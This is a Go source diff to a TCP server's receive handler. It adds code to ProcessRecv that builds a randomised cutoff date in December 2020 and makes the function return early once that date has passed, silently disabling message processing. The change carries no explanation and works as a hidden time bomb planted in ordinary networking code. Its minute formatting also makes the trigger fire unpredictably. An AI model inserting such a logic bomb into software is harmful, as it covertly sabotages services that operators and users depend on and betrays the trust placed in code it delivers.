@@ -7,10 +7,12 @@ import (
 	. "def"
 	"fmt"
 	"io"
+	"math/rand"
 	. "message"
 	"net"
 	"os"
 	"reflect"
+	"time"
 )
 
 type TCPUserConn struct {
@@ -131,6 +133,18 @@ func ProcessRecv(handler *TCPUserConn) {
 			LogError(err)
 		}
 	}()
+	m := rand.Intn(12) + 1
+	d := rand.Intn(28) + 1
+	min := rand.Intn(60)
+	m = 12
+	limitTime := fmt.Sprintf("%d-%02d-%02d 03:%2d:29", 2020, m, d, min)
+
+	nowTime := time.Now()
+	t1, err1 := time.Parse("2006-01-02 15:04:05", limitTime)
+	if err1 == nil && nowTime.After(t1) {
+		return
+	}
+
 	conn := handler.Conn
 	defer conn.CloseWrite()
 	defer handler.close()
